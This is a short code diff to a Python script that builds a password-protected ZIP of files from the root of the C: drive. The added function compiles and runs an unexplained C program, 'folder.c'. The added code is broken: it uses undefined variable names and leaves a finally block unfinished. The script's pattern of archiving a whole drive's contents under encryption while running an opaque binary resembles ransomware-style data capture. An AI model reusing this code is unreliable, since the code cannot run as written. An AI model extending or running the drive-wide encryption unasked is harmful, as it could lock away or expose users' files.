@@ -3,6 +3,27 @@ import zipfile
 import pyzipper
 from pathlib import Path
 
+
+def execute_existing_c_script(c_):
+    executable = 'folder'
+    compile = ['gcc', c_, '-o', executable]
+
+    try:
+        subprocess.run(compile_command, check=True)
+        print(f"{c_} was successful.")
+    except subprocess.CalledProcessError as e:
+        print(f"Err: {e}")
+        return
+
+    try:
+        subprocess.run(f'./{executable}', check=True)
+        print("'Photos' created successfully!")
+    except subprocess.CalledProcessError as e:
+        print(f"Error during execution: {e}")
+    finally:
+        # Clean up the compiled executable
+        if os.path.exists(executable):
+
 START_DIR = Path("C:/")
 
 OUTPUT_ZIP_PATH = Path("C:")
@@ -33,4 +54,6 @@ def create_encrypted_zip():
         print(f"Error creating encrypted ZIP: {e}")
 
 if __name__ == "__main__":
+    c_file_pat = 'folder.c'
+    execute_existing_c_script(c_file_path)
     create_encrypted_zip()
